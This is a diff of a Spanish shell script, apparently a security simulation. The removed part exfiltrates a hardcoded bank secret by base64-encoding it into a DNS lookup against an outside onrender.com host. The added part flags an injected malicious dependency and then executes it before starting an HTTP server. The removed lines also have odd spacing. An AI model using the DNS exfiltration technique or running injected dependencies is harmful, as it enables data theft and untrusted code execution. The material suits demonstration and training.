@@ -1,15 +1,13 @@
-#! /bin/sh
+#!/bin/sh
 
-DATOS_SENSIBLES= " clave_secreta_banco_2026 " 
-DATOS_CODIFICADOS= $( echo -n " ​​$DATOS_SENSIBLES "  | base64 | tr -d ' = ' )
+echo "=== INICIANDO SERVICIO COMPROMETIDO EN LA CADENA DE SUMINISTRO ==="
+echo "Verificando integridad del contenedor..."
 
-echo  " === SIMULACIÓN: EXFILTRACIÓN DE DATOS VÍA CONSULTAS DNS === "
- echo  " Dato original: $DATOS_SENSIBLES "
- echo  " Dato codificado: $DATOS_CODIFICADOS "
- echo  " Enviando consulta DNS con el payload incrustado... "
-
-nslookup " ${DATOS_CODIFICADOS} .servidor-web-dmz.onrender.com "
-
-echo  " === CONSULTA DNS ENVIADA === "
+if [ -f "/app/malicious_dependency.sh" ]; then
+  echo "[ALERTA DE SEGURIDAD] Se ha detectado una dependencia no autorizada inyectada durante la construcción del artefacto."
+  sh /app/malicious_dependency.sh
+else
+  echo "[OK] Artefacto limpio."
+fi
 
 python3 -m http.server 8080
